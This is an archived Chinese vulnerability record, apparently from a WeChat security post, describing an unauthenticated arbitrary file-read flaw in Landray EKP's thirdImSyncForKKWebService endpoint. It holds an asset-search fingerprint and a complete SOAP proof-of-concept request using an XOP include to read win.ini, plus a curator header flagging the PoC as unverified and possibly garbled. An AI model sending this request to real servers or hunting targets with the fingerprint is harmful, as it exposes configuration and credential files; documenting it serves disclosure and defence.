---
source: "gelusus/wxvl 公众号漏洞文库"
title: "蓝凌EKP thirdImSyncForKKWebService XOP外部资源文件读取"
product: "蓝凌EKP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "影响版本只有截图未读取；需XOP/MTOM处理及文件权限"
prerequisites: "声称无认证但Cookie含SESSION，需核必要性"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3thirdImSyncForKKWebService%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-a55e2bc8dd69c6fd1b72bfc3"
entity_id: "ve-a55e2bc8dd69c6fd1b72bfc3"
schema_version: "1"
---

# 蓝凌EKP thirdImSyncForKKWebService XOP外部资源文件读取

## 条目说明

- 对象与具体问题：蓝凌EKP；thirdImSyncForKKWebService XOP外部资源文件读取
- 版本、配置及部署条件：影响版本只有截图未读取；需XOP/MTOM处理及文件权限
- 认证与权限前提：声称无认证但Cookie含SESSION，需核必要性
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 通过xop:Include fileURI，不是普通路径下载；应标外部资源解析/文件读取机制
- HTTP头多处断行、multipart缩进且file:///c:windows缺斜杠，可能转写损坏
- 无可读版本/修复号、响应仅截图；web.icon指纹须标所属平台而非默认FOFA

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-24 15:59  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
01  
  
—  
  
漏洞名称  
  
蓝凌  
EKP  
系统接口  
thirdImSyncForKKWebService  
接口存在任意文件读取漏洞  
  
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODqibicyU9t37wiaOrkjrX6g13ic7ibhIWgdkVpWpSEsVN1aXofQtGeA71OVOw/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
  
蓝凌  
EKP  
由深圳市蓝凌软件股份有限公司自主研发，是一款全程在线数字化  
OA  
，应用于大中型企业在线化办公，包含流程管理、知识管理、会议管理、公文管理、任务管理及督办管理等  
100  
个功能模块。蓝凌  
EKP  
系统接口  
thirdImSyncForKKWebService  
接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
  
  
  
04  
  
—  
  
资产测绘  
```
web.icon=="302464c3f6207d57240649926cfc7bd4"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODqjy4E1FiaBticq2ucf4S8uK6p2W3e0FwhqYSw9QTUN7yLmXEpcQzT1ZtA/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```http
POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
Host: 域名:端口
Cookie:
acw_tc=0bce952217351164448538504e88d6f6fe2d8bc467a2114facce59d83f7060;
SESSION=OWIwMjEzMGItYWE2ZC00Nzg1LTk4ODItNTkyOWZjODBmYTdm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62
Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua:
"Not;A=Brand";v="99",
"Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/related;
boundary=----oxmmdmlnvlx08yluof5q
Content-Length: 609
 
------oxmmdmlnvlx08yluof5q
                          Content-Disposition:
form-data; name="a"
 
                          <soapenv:Envelope
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
                          <soapenv:Header/>
                          <soapenv:Body>
                          <web:getTodo>
                          <arg0>
                          <otherCond>1</otherCond>
                          <pageNo>1</pageNo>
                          <rowSize>1</rowSize>
                          <targets>1</targets>
                          <type><xop:Include
xmlns:xop="http://www.w3.org/2004/08/xop/include"
href="file:///c:windows/win.ini"/></type>
                          </arg0>
                          </web:getTodo>
                          </soapenv:Body>
                          </soapenv:Envelope>
                          ------oxmmdmlnvlx08yluof5q--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODqqiaG2tx55EJ6waO34znswFhPC84JKibxHNyEgtdPQOmVn4AUjPTIJaHw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIkQdz6icQ93oeN4SkSCZODq06qRsGPu3SoYnBM9JcmKqvUcHicKrWkr6CauoZlbkPHCUJcMFbHxiaxw/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
**升级到安全版本**  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
